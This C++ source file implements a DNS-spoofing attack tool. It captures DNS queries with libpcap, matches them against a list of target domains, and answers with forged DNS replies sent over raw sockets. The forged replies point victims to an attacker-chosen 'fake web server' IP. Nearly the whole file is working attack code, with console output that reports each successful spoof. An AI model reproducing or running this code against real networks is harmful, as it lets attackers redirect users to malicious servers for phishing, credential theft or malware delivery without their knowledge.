#include "packet_handler.hpp"

void packet_handle::set_my_ip(){
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, (const char*)this->interface_name, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    this->my_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}


int packet_handle::set_network_interface(){
    if(this->get_attack_list().size()==0){return -1;}
    if (pcap_findalldevs(&alldevs, errbuf) < 0) {return -2;}

	for (d = alldevs; d; d = d->next) {
        if(d->next==NULL){break;}
        adhandle = pcap_open_live(d->name, 1000, 1, 300, errbuf);
		if (pcap_datalink(adhandle) == DLT_EN10MB && d->addresses != NULL) {
            interface_list.push_back(d->name);
		}
        pcap_close(adhandle);
	}
}


void packet_handle::print_network_interface(){
    printf("┌────┬─────────────┐\n");
    printf("│ No │ interface   │\n");
    printf("├────┼─────────────┤\n");
	for (int i = 0; i < interface_list.size(); i++) {
        printf("│ %-2d │ %-10s  │\n", i+1, interface_list[i]);
	}
    printf("└────┴─────────────┘\n");
}


int packet_handle::select_network_interface(){
	printf("Enter the interface number you would like to sniff : ");
	scanf("%d", &(this->interface_number));
}


int packet_handle::packet_capture_start(){
    const char * filter = "port 53 and (udp and (udp[10] & 128 = 0))";     // Recv
    if(this->interface_number <1 || this->interface_number > interface_list.size()){return -3;}   
    strcpy(this->interface_name, interface_list[this->interface_number-1]);
    if (!(adhandle=pcap_open_live(this->interface_name, 65536, 1, 1000, errbuf))) {return -4;}
	if (pcap_compile(adhandle, &fcode, filter, 1, mask) == -1) {return -5;}
	if (pcap_setfilter(adhandle, &fcode) == -1) {return -6;}
    pcap_freealldevs(alldevs);
    return 0;
}


void packet_handle::print_attack_info(){
    printf("┌───────────────────────────────────────────────────────────────────────────────────────────────────┐\n");
    printf("│            dns-spoofing: linstening on %d [udp dst port 53 and not src %15s]            │\n", this->interface_number, my_ip);
    printf("├────┬─────────────────┬───────┬─────────────────┬───────┬───────────┬────────┬───┬─────────────────┤\n");
    printf("│Info│    source ip    │ sport │ destination ip  │ dport │ Data size │   ID   │Q&A│   information   │\n");
    printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
    fflush(stdout);
}


void packet_handle::start_capture_loop(){
    while (1) {
        if ((this->pkt_data = pcap_next(this->adhandle, &(this->header))) != NULL) {
            set_protocol_header();
            make_domain();
            set_attack_data();
            packet_handler();
        }
    }
}


void packet_handle::set_protocol_header(){
    this->eth = (ether_header*)(this->pkt_data);
    this->ip = (ip_header *)(this->pkt_data + sizeof(ether_header));
    this->udp = (udp_header *)(this->pkt_data + sizeof(ether_header) + sizeof(ip_header));
    this->dns = (dns_header *)(this->pkt_data + 42);
}


void packet_handle::set_attack_data(){
    sport = ntohs(udp->sport);
    dport = ntohs(udp->dport);
    dns_id = ntohs(dns->ID);

    memset(display_domain, 0x00, 1024);
    memcpy(display_domain, extract_domain, strlen(extract_domain));
    
    if(strlen(display_domain)>16){
        memset(display_domain+12, '.', 3);
        memset(display_domain+15, 0x00, strlen(display_domain));
    }
    
    snprintf(source_ip, sizeof(source_ip), "%d.%d.%d.%d", ip->saddr.byte1, ip->saddr.byte2, ip->saddr.byte3, ip->saddr.byte4);
    snprintf(dest_ip, sizeof(dest_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
}


void packet_handle::print_attack_success(){
    for (int j = 0; j < 101 ; j++) {
        printf("\b \b");
    }
    printf("├────┼─────────────────┼───────┼─────────────────┼───────┼───────────┼────────┼───┼─────────────────┤\n");
    printf("│Recv│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ Q │ %-16s│\n", source_ip, sport, dest_ip, dport, header.caplen,dns_id, display_domain);
    printf("│Send│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ A │ %-16s│\n", my_ip, dport, source_ip, sport, full_size, dns_id, fake_webserver_ip);
    printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
    fflush(stdout);
}


void packet_handle::set_attack_ip_header(){
    ip->tlen = htons(sizeof(ip_header) + sizeof(udp_header) + full_size);
    ip_address temp = ip->daddr;
    ip->daddr = ip->saddr;
    ip->saddr = temp;
}


void packet_handle::set_attack_udp_header(){
    int temp_port = udp->sport;
    udp->sport = htons(53);
    udp->dport = temp_port;
    udp->len = htons(sizeof(udp_header) + full_size);

    udp->crc = 0;
}


void packet_handle::packet_handler() {
    if(compare_domain(extract_domain)){
        unsigned char dns_response[1024];
        unsigned char *dns_reply_hdr;

        memset(dns_response, 0x00, 1024);
        dns_reply_hdr = dns_response + sizeof(ip_header) + sizeof(udp_header);

        dns_reply_hdr[0]=dns->ID & 0xff; dns_reply_hdr[1]=(dns->ID >> 8) & 0xff;
        dns_reply_hdr[2]=0x81; dns_reply_hdr[3]=0x80;
        dns_reply_hdr[4]=dns->QDCNT & 0xff; dns_reply_hdr[5]=(dns->QDCNT >> 8) & 0xff;
        dns_reply_hdr[6]=0x00; dns_reply_hdr[7]=0x01;
        dns_reply_hdr[8]=dns->NSCNT & 0xff; dns_reply_hdr[9]=(dns->NSCNT >> 8) & 0xff;
        dns_reply_hdr[10]=dns->ARCNT & 0xff; dns_reply_hdr[11]=(dns->ARCNT >> 8) & 0xff;
    
        int size = header.caplen-54-4;

        for(int i=0;i<size;i++){
            dns_reply_hdr[12+i]=pkt_data[i+54];
        }

        dns_reply_hdr[size+12]=0x00; dns_reply_hdr[size+13]=0x01; 
        dns_reply_hdr[size+14]=0x00; dns_reply_hdr[size+15]=0x01; 
        dns_reply_hdr[size+16]=0xc0; dns_reply_hdr[size+17]=0x0c;
        dns_reply_hdr[size+18]=0x00; dns_reply_hdr[size+19]=0x01;
        dns_reply_hdr[size+20]=0x00; dns_reply_hdr[size+21]=0x01;
        dns_reply_hdr[size+22]=0x00; dns_reply_hdr[size+23]=0x00;
        dns_reply_hdr[size+24]=0x00; dns_reply_hdr[size+25]=0x34;
        dns_reply_hdr[size+26]=0x00; dns_reply_hdr[size+27]=0x04;

        for(int i=0;i<this->get_domain_array().size();i++){
            if(strcmp(extract_domain, this->get_domain_array()[i].c_str())==0){
                strcpy(fake_webserver_ip,this->get_attack_list()[i].first.c_str());
            }
        }

        unsigned char ip_in_hex[4];
        sscanf(fake_webserver_ip, "%d.%d.%d.%d",(int *)&ip_in_hex[0],(int *)&ip_in_hex[1], (int *)&ip_in_hex[2], (int *)&ip_in_hex[3]); //copy arg to int array
        memcpy(&dns_reply_hdr[size+28], ip_in_hex, 4);

        full_size = size+32;
        
        set_attack_ip_header();
        set_attack_udp_header();

        memcpy(&dns_response[0], (char *)ip, sizeof(ip_header));
        memcpy(&dns_response[sizeof(ip_header)], (char *)udp, sizeof(udp_header));

        char target_ip[16];
        snprintf(target_ip, sizeof(target_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
        full_size = full_size + (sizeof(ip_header) + sizeof(udp_header));

        sned_dns_packet(target_ip, udp->dport, dns_response, full_size);
        print_attack_success();
    }
}


void packet_handle::make_domain(){
    memset(extract_domain, 0x00, 1024);
    char dns_data[1024];
    memset(dns_data, 0x00, 1024);

    for(int i=0;i<header.caplen;i++){
        dns_data[i] = (unsigned int)pkt_data[i+54];
    }

    int size_before_dot = dns_data[0], index = 0, size_index = 1;

    while(size_before_dot > 0) {
        for(int i=0;i<size_before_dot;i++){
            extract_domain[index++] = dns_data[i+size_index];
        }
        extract_domain[index++]='.';
        size_index+=size_before_dot;
        size_before_dot = dns_data[size_index++];
    }

    extract_domain[--index]='\0';
}


void packet_handle::sned_dns_packet(char *target_ip, int port, unsigned char *dns_packet,int size){
    struct sockaddr_in serv_addr;
    int tmp=1, sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    inet_pton(AF_INET, target_ip, &(serv_addr.sin_addr));

    if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        printf("setsockopt hdrincl error\n");
    };

    if (sendto(sfd, dns_packet, size, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr))<0) {
        printf("error sending UDP\n");
    }
}


bool packet_handle::compare_domain(const char *target_domain){
    for(int i=0;i<this->get_domain_array().size();i++){
        if(strcmp(extract_domain, "")!=0 && strcmp(target_domain, this->get_domain_array()[i].c_str())==0){
            return true;
        }
    }

    return false;
}